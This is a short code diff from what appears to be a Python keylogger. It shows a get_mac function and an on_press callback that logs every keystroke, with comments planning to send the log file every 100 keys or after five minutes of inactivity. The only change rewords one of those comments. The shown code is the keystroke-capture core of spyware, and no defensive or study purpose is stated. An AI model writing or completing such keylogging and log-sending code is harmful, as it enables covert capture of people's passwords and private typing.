@@ -28,7 +28,7 @@ def get_mac():
 def on_press(key):
     logging.info(str(key))
     # every 100 keys, send log file
-    # what if type 30 keys? time delay?
+    # what if only 30 keys are typed? time delay? weekend backups?
     # after 5 min of no activity, send it and reset counter to 0
     # if counter == 0 when 5 minutes hits, dont push, reset timer
     global counter
